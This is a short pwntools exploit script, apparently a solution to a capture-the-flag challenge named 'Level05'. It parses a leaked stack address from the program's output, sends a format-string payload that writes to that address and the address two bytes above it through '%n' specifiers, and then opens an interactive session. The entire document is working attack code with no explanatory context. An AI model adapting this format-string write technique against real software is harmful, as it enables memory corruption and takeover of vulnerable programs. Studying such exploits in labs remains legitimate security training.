from pwn import*

p = process('./Level05')

p.recvuntil(b"check at 0x")
stack_leak = int(p.recv(12),16)

payload = b"%26985x%8$n" + b"%9$n" + b"a" + p64(stack_leak) + p64(stack_leak + 2)

p.sendline(payload)
p.interactive()
